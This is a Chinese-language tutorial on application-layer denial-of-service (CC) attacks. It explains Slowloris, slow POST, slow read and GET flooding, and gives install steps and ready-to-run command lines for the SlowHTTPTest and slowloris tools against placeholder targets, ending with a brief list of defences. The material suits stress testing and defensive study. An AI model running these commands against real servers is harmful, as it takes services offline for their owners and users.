# 应用层拒绝服务攻击
CC（Chanllenge Collapsar）：CC就是DDoS的一种。

通过控制某些主机补丁发送大量数据包给服务器造成服务器资源耗尽，一直到宕机崩溃，常用于攻击页面。

## 应用层拒绝服务攻击分类
### Get-Flood
直接对较为消耗资源的URL进行大量的请求，也可以通过多个URL并发，单一URL并发请求，随机URL请求等。

### SlowLoris
也称为slow headers，攻击者始终构造不完整的http header发送，同时还间隔一定时间再发送数据，导致服务器一直处于等待状态。

### SlowPost
也称为slow body，攻击的重点在POST数据上，通过将HTTP Header中的Content-Length设置为一个较大的值，同时还间隔一定时间再发送数据，导致服务器一直处于等待状态中。

### SlowRead
把window窗口设置为一个非常小的值，让服务器始终准备回应数据。

### HashDos

## 测试工具
### SlowHTTPTest
[github地址](https://github.com/shekyan/slowhttptest)

* **Centos7编译安装SlowHTTPTest**

```
yum install gcc.x86_64 gcc-c++.x86_64 openssl-devel.x86_64 -y
yum install automake.noarch autoconf.noarch -y

git clone https://github.com/shekyan/slowhttptest && cd slowhttptest
./configure
autoreconf -ivf
make && make install
```

* **SlowHTTPTest使用**

```
-H SlowLoris模式
-B SlowPost模式
-R Range Header模式
-X Slow Read模式

-g 生成统计信息
-o 指定输出文件名
-v 日志等级

-c 建立的连接数，默认为50
-i 在SlowLoris和Slow Post模式中，数据发送的间隔，默认为10
-l 测试维持时间，默认为240
-r 每秒连接个数，默认为50
-s 声明Content-Length header值，默认为4096
-t http verb在请求时使用什么操作，默认为GET
-u 指定目标URL
-x 在SlowLoris和Slow Post模式中，指定发送的最大数据层航都
-y 在Slow Read模式中指定tcp窗口范围上限，默认为32
-f 指定Content-Type Header，默认为application/x-www-form-urlencoded
-m 指定Accept Header，默认为text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5

-d 为所有连接指定代理
-e 为探测连接指定代理
-p 指定等待时间来确认攻击已经成功
```

* **SlowHTTPTest使用案例**

```
# slowloris模式
slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u URL -x 24 -p 3

# slowpost模式
slowhttptest -c 3000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t POST -u URL -x 10 -p 3

# slowread模式
slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u URL -p 3
```

### slowloris
* **slowloris安装**

```
# pip安装
pip3 install slowloris
slowloris example.com

# git下载
git clone https://github.com/gkbrk/slowloris.git && cd slowloris
python3 slowloris.py example.com
```

* **slwoloris使用**

```
-p PORT 指定端口，默认80
-s SOCKETS 套接字数量，默认150
-v 增加日志记录
-ua 对每个请求随机化UA参数
--proxy-host PROXY_HOST SocketS5代理主机，默认127.0.0.1
--porxy-port PROXY_PORT SocketS5代理端口，默认8080
--https 对请求使用https

# SocketS5代理支持，需要额外安装PySocks Python模块
pip3 install PySocks
```

* **slwoloris使用案例**

```
python slowloris.py IP # 攻击http 80端口

python slowloris.py -p 443 --https IP # 攻击https 443端口
```

## CC攻击防御
* 判断UA字段（不可靠，可以随意构造绕过）；
* 网页中嵌入JS代码（不可靠，爬虫可以携带浏览器引擎，或者加载JS）；
* 针对IP+Cookie限制访问频率（不可靠，Cookie可以伪造，IP存在代理池问题）；
* 关闭Apache最大连接数等，合理配置中间件，缓解DDoS攻击；
* 页面中添加验证码；
* 合理优化代码，合理使用缓存技术，减少数据库的读写操作；
